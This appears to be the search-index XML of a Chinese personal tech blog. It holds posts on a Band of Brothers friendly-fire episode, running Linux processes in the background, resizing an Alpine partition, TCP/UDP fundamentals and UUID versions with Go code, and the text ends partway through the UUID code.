<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>兄弟连中Moose被哨兵误伤的解释</title>
      <link href="/2024/01/08/xiong-di-lian-zhong-moose-bei-shao-bing-wu-shang-de-jie-shi/"/>
      <url>/2024/01/08/xiong-di-lian-zhong-moose-bei-shao-bing-wu-shang-de-jie-shi/</url>
      
        <content type="html"><![CDATA[<p>电影同名书籍中有这样一段 Winters 的独白：</p><p>"As Moose and I proceeded down the path leading to Welsh's CP,"Winters related, "we were walking shoulder to shoulder, as the path wasonly about six feet wide, slightly raised. There was a drop of aboutthree feet into a drainage ditch on each side." Out of the darkness camean order, "Halt!" Heyliger was a calm, easygoing man, a C.O. who did notget excited unnecessarily. So when Winters felt him take an extra harddeep breath, he tensed. Winters figured Heyliger had forgotten thepassword. Heyliger started to say "Moose," but before he got the wordhalf out, blam, blam, Warn—an M-l spat three bullets out from a distanceof 10 yards. Heyliger dropped to the road with a moan. Winters divedinto the ditch on the left side of the road. He feared they had run intoa German patrol because the M-l fire had been so rapid it could havebeen a German machine pistol. Then he heard footsteps running away.</p><p>温特斯："当我和穆斯沿着通往威尔士公民保护区的小路前行时，我们肩并肩地走着，因为这条小路只有大约六英尺宽。小路中央略微凸起，路两边各有一条深三英尺的排水沟"。走着走着，黑暗中突然有人命令道："停下！"</p><p>在 Winters 心目中，Heyliger是一个冷静、随和的人，一个不会无端激动的指挥官。但温特斯能感觉到，他在急促地呼吸，他紧张了。Winters猜测 Heyliger 忘记了口令。 Heyliger迫不得已，开始说："Moose!"，但话还没说到一半，砰砰砰三声，三颗子弹从 10码外的地方击中了他。 Heyliger 呻吟着倒在了路上。Winters跳进了路左侧的沟里。他担心他们遇到了德军巡逻队，因为枪声非常急促，可能是德军的机关枪。然后，他听到了逃跑的脚步声。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux 使程序在后台长久运行</title>
      <link href="/2023/11/09/linux-shi-cheng-xu-zai-hou-tai-chang-jiu-yun-xing/"/>
      <url>/2023/11/09/linux-shi-cheng-xu-zai-hou-tai-chang-jiu-yun-xing/</url>
      
        <content type="html"><![CDATA[<p>想要程序在后台长久运行有多种方法：</p><h3 id="使用-nohup-的方法">1、使用 nohup + &amp; 的方法</h3><p>nohup 使用方法如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> COMMAND <span class="token operator">></span> stdout.log <span class="token operator"><span class="token file-descriptor important">2</span>></span> stderr.log <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述命令，会把程序的标准输出写入 stdout.log 文件；错误输出写入stderr.log 文件</p><p>或者</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">nohup COMMAND > stdout.log 2>&amp;1 &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述命令，会把标准输出和错误输出全都写入 stdout.log 文件。</p><h3 id="关于nohup"><strong>关于nohup：</strong></h3><p>gnu官方文档<ahref="https://www.gnu.org/software/coreutils/manual/html_node/nohup-invocation.html%23nohup-invocation">(GNUCoreutils 9.1)</a>对<code>nohup</code>命令说明如下：</p><blockquote><p><code>nohup</code>runs the given <em>command</em> with hangup signalsignored, so that the command can continue running in the backgroundafter you log out.</p></blockquote><p>也就是说使用<code>nohup</code> 启动的命令会忽略 <code>hangup</code>信号，所以当退出登录时，该命令会在后台继续运行。</p><p>既然说明里提到了<code>hangup</code>信号（<code>hangup signals</code>），我们就来看看什么是<code>hangup</code>信号。使用<code>kill -l</code>命令可以看到系统里所有的信号:</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">$ kill -l 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP 6) SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL10) SIGUSR1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中，<code>SIGHUP</code>就是上文提到的<code>hangup</code>信号，编号为1。</p><p>使用<code>man</code> <code>7 signal</code>命令，可以看到关于信号较为详细的说明，其中关于<code>SIGHUP</code>的说明如下：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Signal     Value     Action   Comment       ──────────────────────────────────────────────────────────────────────       SIGHUP        1       Term    Hangup detected on controlling terminal                                     or death of controlling process<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>根据说明，当控制终端挂断（也就是断开）或控制进程死亡时，会发出<code>SIGHUP</code>信号，收到该信号的进程的默认行为（action）是<code>Term</code> ，<code>Term</code> 行为的描述如下：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Term   Default action is to terminate the process.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>综上所述，当终端退出时，会发出<code>SIGHUP</code>信号，接收到该信号的进程的默认行为就是中止进程。那么，会给哪些进程发送信号呢？GNU文档<ahref="https://link.zhihu.com/?target=https%3A//www.gnu.org/software/libc/manual/html_node/Termination-Signals.html">Termination-Signals</a>对此有如下说明：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Macro: int SIGHUPThis signal is also used to report the termination of the controlling process on a terminal to jobs associated with that session; this termination effectively disconnects all processes in the session from the controlling terminal.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>翻译过来就是，当一个终端的控制进程中止时，会报告给同一<code>session</code>下关联的的所有<code>job</code>。</p><p>当我们使用终端登录时，系统自动为我们分配一个<code>session</code>，从该终端启动的所有进程及其<ahref="https://www.zhihu.com/search?q=子进程&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2912149567%7D">子进程</a>，都隶属于同一个<code>session</code>，该<code>session</code>下的所有进程称为一个<code>session</code>组；当用户退出登录时，该<code>session</code>组下的进程将会收到<code>SIGHUP</code>信号。</p><p><strong>综上所述，当终端退出时，该<code>session</code>下的所有进程收到</strong><strong><code>SIGHUP</code>信号，该信号的默认行为是中止进程；而使用<code>nohup</code>启动的进程，会忽略该信号</strong>。</p><h3 id="使用-tmux">2、使用 tmux</h3><p>tmux 用起来还是比较复杂，下载及使用可以参考官方地址：</p><p><ahref="https://github.com/tmux/tmux/wiki">https://github.com/tmux/tmux/wiki</a></p><h3 id="使用-screen">3、使用 screen</h3><p>screen 与 tmux 类似，可参考这里：</p><p><a href="https://www.gnu.org/software/screen/">Screen - GNU Project -Free Software Foundation</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Resize partition in Alpine Linux</title>
      <link href="/2023/10/06/resize-partition-in-alpine-linux/"/>
      <url>/2023/10/06/resize-partition-in-alpine-linux/</url>
      
        <content type="html"><![CDATA[<p>在 PVE 或 ESXi 中扩大虚拟硬盘容量后再操作。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">apk <span class="token function">add</span> --no-cache <span class="token function">cfdisk</span> e2fsprogs-extra<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cfdisk</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择需要扩容的分区，选择 Resize 最后 Write 将操作写入磁盘。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">resize2fs /dev/<span class="token operator">&lt;</span>扩容分区<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【计算机网络】TCP、UDP协议详解</title>
      <link href="/2023/09/13/ji-suan-ji-wang-luo-tcp-udp-xie-yi-xiang-jie/"/>
      <url>/2023/09/13/ji-suan-ji-wang-luo-tcp-udp-xie-yi-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="一为什么会有tcpip协议">一、为什么会有TCP/IP协议？</h2><p>在世界上各地，各种各样的电脑运行着各自不同的操作系统为大家服务，这些电脑在表达同一种信息的时候所使用的方法是千差万别。计算机使用者意识到，计算机只是单兵作战并不会发挥太大的作用。只有把它们联合起来，电脑才会发挥出它最大的潜力，于是人们就想方设法的把电脑连接到了一起。</p><p>但是简单的连到一起是远远不够的，就好像语言不同的两个人互相见了面，完全不能交流信息。因而他们需要定义一些共通的东西来进行交流，TCP/IP就是为此而生。TCP/IP 指传输控制协议/网际协议(<strong>T</strong>ransmission <strong>C</strong>ontrol<strong>P</strong>rotocol / <strong>I</strong>nternet<strong>P</strong>rotocol)，定义了电子设备（比如计算机）如何连入因特网，以及数据如何在它们之间传输的标准。但TCP/IP 不只是一个协议，而是一个协议族的统称。在 TCP/IP中包含一系列用于处理数据通信的协议：</p><ul><li>TCP (传输控制协议) - 应用程序之间通信</li><li>UDP (用户数据包协议) - 应用程序之间的简单通信</li><li>IP (网际协议) - 计算机之间的通信</li><li>ICMP (因特网消息控制协议) - 针对错误和状态</li><li>DHCP (动态主机配置协议) - 针对动态寻址</li></ul><p>电脑有了这些协议，就好像学会了外语一样，就可以和其他的计算机终端做自由的交流了。</p><p>虽然上篇的 OSI参考模型是计算机网络协议的标准，但由于其开销太大，所以真正采用它的情况并不多。TCP/IP协议则不然，由于它的简洁、实用，从而得到了广泛的应用。可以说，TCP/IP协议已成为建立计算机局域网、广域网的首选协议，已成为事实上的工业标准和国际标准。</p><h2 id="二tcp协议">二、TCP协议</h2><p>TCP（Transmission ControlProtocol，传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议，其传输的单位是报文段。</p><p>特征：</p><ul><li>面向连接</li><li>只能点对点（一对一）通信</li><li>可靠交互</li><li>全双工通信</li><li>面向字节流</li></ul><p>TCP 如何保证可靠传输：</p><ul><li>确认和超时重传</li><li>数据合理分片和排序</li><li>流量控制</li><li>拥塞控制</li><li>数据校验</li></ul><p>TCP的协议应用包括：FTP（文件传输协议）、Telnet（远程登录协议）、SMTP（简单邮件传输协议）、POP3（和SMTP相对，用于接收邮件）、HTTP协议等。</p><h3 id="tcp-报文结构">2.1 TCP 报文结构</h3><p>TCP 报文结构：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://camo.githubusercontent.com/c47b30002614e3d26fd64a02cadb9497bd51d3b8cae015ac58de93ef6d871e0f/68747470733a2f2f67697465652e636f6d2f6875696875742f696e746572766965772f7261772f6d61737465722f696d616765732f5443502545362538412541352545362539362538372e706e67" alt="TCP 报文"><figcaption aria-hidden="true">TCP 报文</figcaption></figure><p>TCP 首部：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://camo.githubusercontent.com/c850dd8c5a34fa83b55d76d38847afffc520b69e5ea8d54cadc232092aecb608/68747470733a2f2f67697465652e636f6d2f6875696875742f696e746572766965772f7261772f6d61737465722f696d616765732f5443502545392541362539362545392538332541382e706e67" alt="TCP 首部"><figcaption aria-hidden="true">TCP 首部</figcaption></figure><p>TCP：状态控制码（Code，Control Flag），占 6 比特，含义如下：</p><ul><li>URG：紧急比特（urgent），当 <code>URG＝1</code>时，表明紧急指针字段有效，代表该封包为紧急封包。它告诉系统此报文段中有紧急数据，应尽快传送(相当于高优先级的数据)，且上图中的 Urgent Pointer 字段也会被启用。</li><li>ACK：确认比特（Acknowledge）。只有当 <code>ACK＝1</code>时确认号字段才有效，代表这个封包为确认封包。当 <code>ACK＝0</code>时，确认号无效。</li><li>PSH：（Push function）若为 1时，代表要求对方立即传送缓冲区内的其他对应封包，而无需等缓冲满了才送。</li><li>RST：复位比特(Reset)，当 <code>RST＝1</code> 时，表明 TCP连接中出现严重差错（如由于主机崩溃或其他原因），必须释放连接，然后再重新建立运输连接。</li><li>SYN：同步比特(Synchronous)，SYN 置为1，就表示这是一个连接请求或连接接受报文，通常带有 SYN标志的封包表示『主动』要连接到对方的意思。</li><li>FIN：终止比特(Final)，用来释放一个连接。当 <code>FIN＝1</code>时，表明此报文段的发送端的数据已发送完毕，并要求释放运输连接。</li></ul><h3 id="tcp-黏包问题">2.2 TCP 黏包问题</h3><p><strong>原因</strong></p><p>TCP 是一个基于字节流的传输服务（UDP 基于报文的），“流” 意味着 TCP所传输的数据是没有边界的。所以可能会出现两个数据包黏在一起的情况。</p><p><strong>解决</strong></p><ul><li>发送定长包。如果每个消息的大小都是一样的，那么在接收对等方只要累计接收数据，直到数据等于一个定长的数值就将它作为一个消息。</li><li>包头加上包体长度。包头是定长的 4个字节，说明了包体的长度。接收对等方先接收包头长度，依据包头长度来接收包体。</li><li>在数据包之间设置边界，如添加特殊符号 <code>\r\n</code> 标记。FTP协议正是这么做的。但问题在于如果数据正文中也含有<code>\r\n</code>，则会误判为消息的边界。</li><li>使用更加复杂的应用层协议。</li></ul><h3 id="tcp-流量控制">2.3 TCP 流量控制</h3><p><strong>概念</strong></p><p>流量控制（flowcontrol）就是让发送方的发送速率不要太快，要让接收方来得及接收。</p><p><strong>方法</strong></p><p>利用可变窗口进行流量控制：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://camo.githubusercontent.com/324e35d7ee34eb9db9f3e5d14dc3d948849afa3e62a91c4a80db156e81c811b1/68747470733a2f2f67697465652e636f6d2f6875696875742f696e746572766965772f7261772f6d61737465722f696d616765732f2545352538382541392545372539342541382545352538462541462545352538462539382545372541412539372545352538462541332545382542462539422545382541312538432545362542352538312545392538372538462545362538452541372545352538382542362545342542382542452545342542452538422e706e67"></p><h3 id="tcp-拥塞控制">2.4 TCP 拥塞控制</h3><p><strong>概念</strong></p><p>拥塞控制就是防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不致过载。</p><p><strong>方法</strong></p><ul><li>慢开始( slow-start )</li><li>拥塞避免( congestion avoidance )</li><li>快重传( fast retransmit )</li><li>快恢复( fast recovery )</li></ul><p>TCP的拥塞控制图：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://camo.githubusercontent.com/70d74d223b4590b707eea102b5daf4da51d744f99dab84a30a9a5e9000ba3c90/68747470733a2f2f67697465652e636f6d2f6875696875742f696e746572766965772f7261772f6d61737465722f696d616765732f2545352542462541422545392538372538442545342542432541302545372541342542412545362538342538462545352539422542452e706e67"></p><h2 id="三tcp-传输连接管理">三、TCP 传输连接管理</h2><p>因为 TCP三次握手建立连接、四次挥手释放连接很重要，所以附上《计算机网络（第 7版）-谢希仁》书中对此章的详细描述：https://gitee.com/huihut/interview/raw/master/images/TCP-transport-connection-management.png</p><h3 id="tcp-三次握手建立连接">3.1 TCP 三次握手建立连接</h3><p>所谓三次握手（Three-WayHandshake）即建立TCP连接，就是指建立一个TCP连接时，需要客户端和服务端总共发送3个包以确认连接的建立。在socket编程中，这一过程由客户端执行connect来触发，整个流程如下图所示：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://camo.githubusercontent.com/02987d37d9ecf26ec08473c5b3f530836c490a06a598ee4b0d3cd6032e430513/68747470733a2f2f67697465652e636f6d2f6875696875742f696e746572766965772f7261772f6d61737465722f696d616765732f5443502545342542382538392545362541432541312545362538462541312545362538392538422545352542422542412545372541422538422545382542462539452545362538452541352e706e67" alt="UDP 报文"><figcaption aria-hidden="true">UDP 报文</figcaption></figure><p>【TCP 建立连接全过程解释】</p><ol type="1"><li>客户端发送 SYN 给服务器，说明客户端请求建立连接；</li><li>服务端收到客户端发的 SYN，并回复 SYN+ACK给客户端（同意建立连接）；</li><li>客户端收到服务端的 SYN+ACK 后，回复 ACK给服务端（表示客户端收到了服务端发的同意报文）；此时服务端收到客户端的ACK，连接已建立，可以开始数据传输。</li></ol><h3 id="tcp-为什么要进行三次握手">3.2 TCP 为什么要进行三次握手？</h3><p>因为信道不可靠，而 TCP想在不可靠信道上建立可靠的传输，双方都需要确认对方收到了自己发送的序列号，确认过程最少要进行三次通信。（而UDP 则不需建立可靠传输，因此 UDP 不需要三次握手。）</p><h3 id="tcp-四次挥手释放连接">3.3 TCP 四次挥手释放连接</h3><p><img src="https://googles.plus/images/loading.gif" data-original="https://camo.githubusercontent.com/209302157a20fd1f442f30199165650023d4c0815c31c9924df1ff2116ea9f1f/68747470733a2f2f67697465652e636f6d2f6875696875742f696e746572766965772f7261772f6d61737465722f696d616765732f5443502545352539422539422545362541432541312545362538432541352545362538392538422545392538372538412545362539342542452545382542462539452545362538452541352e706e67"></p><p>【TCP 释放连接全过程解释】</p><ol type="1"><li>客户端发送 FIN给服务器，说明客户端不会再发送数据给服务器了（请求释放从客户端到服务器的连接）；</li><li>服务器接收到客户端发的 FIN，并回复 ACK给客户端（同意释放从客户端到服务器的连接）；客户端收到服务端回复的ACK，此时释放从客户端到服务器的连接（但服务端到客户端的连接还未释放，并且客户端还可以接收数据），服务端继续发送之前没发完的数据给客户端；</li><li>服务端发送 FIN+ACK给客户端，说明服务端发送完了数据（请求释放从服务端到客户端的连接，就算没收到客户端的回复，过段时间也会自动释放）；</li><li>客户端收到服务端的 FIN+ACK，并回复 ACK给客户端（同意释放从服务端到客户端的连接）；服务端收到客户端的 ACK后，释放从服务端到客户端的连接。</li></ol><h3 id="tcp-为什么要进行四次挥手">3.4 TCP 为什么要进行四次挥手？</h3><p>因为 TCP是全双工模式，客户端请求关闭连接后，客户端向服务端的连接关闭（一二次挥手），服务端继续传输之前没传完的数据给客户端（数据传输），传输完之后服务端才将到客户端的连接关闭（三四次挥手）。所以TCP 释放连接时服务器的 ACK 和 FIN 是分开发送的（中间隔着数据传输），而TCP 建立连接时服务器的 ACK 和 SYN 是一起发送的（第二次握手），所以 TCP建立连接需要三次，而释放连接则需要四次。</p><p>上面答案也可以用来回答：为什么 TCP建立连接需要三次，而释放连接则需要四次？</p><p><strong>【问题】为什么 TCP 连接时可以 ACK 和 SYN 一起发送，而释放时则ACK 和 FIN 分开发送呢？（ACK 和 FIN分开是指第二次和第三次挥手）</strong></p><p>因为服务端要先响应客户端 FIN 请求（服务端发送ACK），然后数据传输，传输完成后，服务端再提出 FIN 请求（服务端发送FIN）；而连接时则没有中间的数据传输，因此连接时可以 ACK 和 SYN一起发送。</p><p><strong>【问题】为什么客户端释放最后需要 TIME-WAIT 等待 2MSL呢？</strong></p><ul><li>为了保证客户端发送的最后一个 ACK报文能够到达服务端。若未成功到达，则服务端超时重传 FIN+ACK报文段，客户端再重传 ACK，并重新计时。</li><li>防止已失效的连接请求报文段出现在本连接中。TIME-WAIT 持续 2MSL可使本连接持续的时间内所产生的所有报文段都从网络中消失，这样可使下次连接中不会出现旧的连接报文段。</li></ul><h2 id="四udp协议">四、UDP协议</h2><p>UDP（User DatagramProtocol，用户数据报协议）是一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务，其传输的单位是用户数据报。</p><p>特征：</p><ul><li>无连接</li><li>尽最大努力交付</li><li>面向报文</li><li>没有拥塞控制</li><li>支持一对一、一对多、多对一、多对多的交互通信</li><li>首部开销小</li></ul><p>UDP协议应用包括：TFTP（简单文件传输协议）、SNMP（简单网络管理协议）、DNS（域名解析协议）、NFS、BOOTP。</p><h3 id="udp-报文结构">4.1 UDP 报文结构</h3><p>UDP 报文结构：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://camo.githubusercontent.com/4ae1964912958d058296c4b4b342d318fbfe701a743c8d480149cd3de5f51d61/68747470733a2f2f67697465652e636f6d2f6875696875742f696e746572766965772f7261772f6d61737465722f696d616765732f5544502545362538412541352545362539362538372e706e67" alt="UDP 报文"><figcaption aria-hidden="true">UDP 报文</figcaption></figure><p>UDP 首部：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://camo.githubusercontent.com/aee3dc63567e825df9cfb9248db2b1a32a9b03475c4f4a9467ab87810fb305d8/68747470733a2f2f67697465652e636f6d2f6875696875742f696e746572766965772f7261772f6d61737465722f696d616765732f5544502545392541362539362545392538332541382e706e67" alt="UDP 首部"><figcaption aria-hidden="true">UDP 首部</figcaption></figure><h3 id="tcp-与-udp-的区别">4.2 TCP 与 UDP 的区别</h3><ol type="1"><li>TCP 面向连接，UDP 是无连接的；</li><li>TCP 提供可靠的服务，也就是说，通过 TCP连接传送的数据，无差错，不丢失，不重复，且按序到达；UDP尽最大努力交付，即不保证可靠交付</li><li>TCP 的逻辑通信信道是全双工的可靠信道；UDP 则是不可靠信道</li><li>每一条 TCP 连接只能是点到点的；UDP支持一对一，一对多，多对一和多对多的交互通信</li><li>TCP 面向字节流（可能出现黏包问题），实际上是 TCP把数据看成一连串无结构的字节流；UDP是面向报文的（不会出现黏包问题）</li><li>UDP没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如IP 电话，实时视频会议等）</li><li>TCP 首部开销20字节；UDP 的首部开销小，只有 8 个字节</li></ol><h3 id="既然udp不可靠那为什么还要使用">4.3既然UDP不可靠，那为什么还要使用？</h3><ul><li>其一：当应用程序使用广播或多播时只能使用 UDP 协议；</li><li>其二：由于他是无连接的，发送数据之前不需要建立连接(TCP需要)，所以速度快。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈 UUID</title>
      <link href="/2023/08/29/qian-tan-uuid/"/>
      <url>/2023/08/29/qian-tan-uuid/</url>
      
        <content type="html"><![CDATA[<p>通用唯一识别码（英语：Universally UniqueIdentifier，缩写：UUID）是用于计算机体系中以识别信息的一个128位标识符。</p><p>UUID按照标准方法生成时，在实际应用中具有唯一性，且不依赖中央机构的注册和分配。UUID重复的概率接近零，可以忽略不计[1][2]。</p><p>因此，所有人都可以自行建立和使用UUID，而且几乎可以确定其不会与既有的标识符重复。也因为如此，在不同地方产生的UUID可以使用于同一个数据库或同一个频道中，而且几乎不可能重复。</p><p>UUID的应用相当普遍，许多计算平台都提供了对于生成和解析UUID的支持。</p><p>1990年代， UUID原本是用于阿波罗电脑的网络计算系统，后被用于开放软件基金会的分布式运算环境。分布式运算环境UUID的初始设计基于网络计算系统UUID，其设计受Domain/OS 中定义和使用的（64位）唯一标识符的启发，这是一个也由阿波罗电脑设计的操作系统。后来，微软视窗平台采用分布式运算环境设计作为全局唯一标识符（GUID）。</p><p>2005年7月，RFC 4122 为 UUID 注册了一个 URN命名空间，并制定了早期的规范。当 RFC 4122作为互联网工程任务组标准发布时，国际电信联盟基于先前的标准和 RFC 4122早期版本标准化了 UUID。</p><h3 id="uuid格式">uuid格式</h3><p>UUID由16个字节组成，一共是128位，转换成16进制表示后共有32位，其定义如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">const</span> Size <span class="token operator">=</span> <span class="token number">16</span><span class="token keyword">type</span> UUID <span class="token punctuation">[</span>Size<span class="token punctuation">]</span><span class="token builtin">byte</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>一般会使用<code>-</code>来连接其中的各个部分，因此，常见的为36个字符：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">784b99c1-2a77-11ec-8421-0800270e658d              <span class="token operator">|</span>    <span class="token operator">|</span>             版本  变体<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在一个UUID中，可以通过上述两个位置得知UUID生成器的版本、以及该版本下的变体版本。UUID现有5个版本，每个版本定义了不同的生成逻辑，因此其安全性和适用场景也有所区别。</p><table><colgroup><col style="width: 13%"><col style="width: 86%"></colgroup><thead><tr class="header"><th>version</th><th>generation rule</th></tr></thead><tbody><tr class="odd"><td>Version 1</td><td>date-time and MAC address</td></tr><tr class="even"><td>Version 2</td><td>date-time and MAC address, DCE security version （removed）</td></tr><tr class="odd"><td>Version 3</td><td>based on MD5 hashing of a named value</td></tr><tr class="even"><td>Version 4</td><td>random</td></tr><tr class="odd"><td>Version 5</td><td>based on SHA-1 hashing of a named value</td></tr></tbody></table><p>在<code>github.com/gofrs/uuid</code>库中的定义如下,之所以没有v2是因为v2版本已经弃用了。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> Generator <span class="token keyword">interface</span> <span class="token punctuation">{</span><span class="token function">NewV1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>UUID<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span><span class="token function">NewV3</span><span class="token punctuation">(</span>ns UUID<span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">)</span> UUID<span class="token function">NewV4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>UUID<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span><span class="token function">NewV5</span><span class="token punctuation">(</span>ns UUID<span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">)</span> UUID<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="uuidv1">uuid:v1</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>g <span class="token operator">*</span>Gen<span class="token punctuation">)</span> <span class="token function">NewV1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>UUID<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>u <span class="token operator">:=</span> UUID<span class="token punctuation">{</span><span class="token punctuation">}</span>timeNow<span class="token punctuation">,</span> clockSeq<span class="token punctuation">,</span> err <span class="token operator">:=</span> g<span class="token punctuation">.</span><span class="token function">getClockSequence</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span> Nil<span class="token punctuation">,</span> err<span class="token punctuation">}</span>binary<span class="token punctuation">.</span>BigEndian<span class="token punctuation">.</span><span class="token function">PutUint32</span><span class="token punctuation">(</span>u<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">uint32</span><span class="token punctuation">(</span>timeNow<span class="token punctuation">)</span><span class="token punctuation">)</span>binary<span class="token punctuation">.</span>BigEndian<span class="token punctuation">.</span><span class="token function">PutUint16</span><span class="token punctuation">(</span>u<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">uint16</span><span class="token punctuation">(</span>timeNow<span class="token operator">&gt;&gt;</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>binary<span class="token punctuation">.</span>BigEndian<span class="token punctuation">.</span><span class="token function">PutUint16</span><span class="token punctuation">(</span>u<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">uint16</span><span class="token punctuation">(</span>timeNow<span class="token operator">&gt;&gt;</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">)</span>binary<span class="token punctuation">.</span>BigEndian<span class="token punctuation">.</span><span class="token function">PutUint16</span><span class="token punctuation">(</span>u<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> clockSeq<span class="token punctuation">)</span>hardwareAddr<span class="token punctuation">,</span> err <span class="token operator">:=</span> g<span class="token punctuation">.</span><span class="token function">getHardwareAddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span> Nil<span class="token punctuation">,</span> err<span class="token punctuation">}</span><span class="token function">copy</span><span class="token punctuation">(</span>u<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> hardwareAddr<span class="token punctuation">)</span>u<span class="token punctuation">.</span><span class="token function">SetVersion</span><span class="token punctuation">(</span>V1<span class="token punctuation">)</span>u<span class="token punctuation">.</span><span class="token function">SetVariant</span><span class="token punctuation">(</span>VariantRFC4122<span class="token punctuation">)</span><span class="token keyword">return</span> u<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从源码可以看出，V1版本的UUID生成基于时间戳和网卡MAC地址，同时设置两个标志位(版本和变体版本)。多次生成后如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">f781c598<span class="token operator">-</span>2afc<span class="token operator">-</span>11ec<span class="token operator">-</span>a8f6<span class="token operator">-</span>0800270e658df6cf8996<span class="token operator">-</span>2afc<span class="token operator">-</span>11ec<span class="token operator">-</span>8afb<span class="token operator">-</span>0800270e658d  第<span class="token number">10</span>位开始后面mac部分相同<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>因此，V1版本可以基于uuid反向推出mac网卡地址以及时间戳，并以此推测出后续生成的uuid，所以它并不安全。</p><h3 id="uuid.v3">uuid.v3</h3><p>为了解决安全性问题，v3版本采用了MD5的方式计算uuid。通过一个已生成的uuid，结合一个名称进行哈希，最后再设置版本和变体版本。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>u1<span class="token punctuation">,</span> err <span class="token operator">:=</span> uuid<span class="token punctuation">.</span><span class="token function">NewV1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span 